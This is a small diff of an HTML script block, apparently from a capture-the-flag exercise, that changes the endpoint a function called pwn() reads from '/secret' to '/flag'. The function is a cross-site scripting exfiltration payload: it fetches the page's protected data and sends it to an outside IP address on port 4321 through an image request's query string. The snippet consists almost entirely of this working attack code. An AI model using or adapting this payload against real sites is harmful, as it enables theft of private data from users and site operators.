@@ -4,7 +4,7 @@
 <script type="text/javascript">
 
 function pwn() {
-    $.get('/secret', function(data) {
+    $.get('/flag', function(data) {
         var image = new Image();
         image.src='http://74.91.113.73:4321?data='+data;
     });
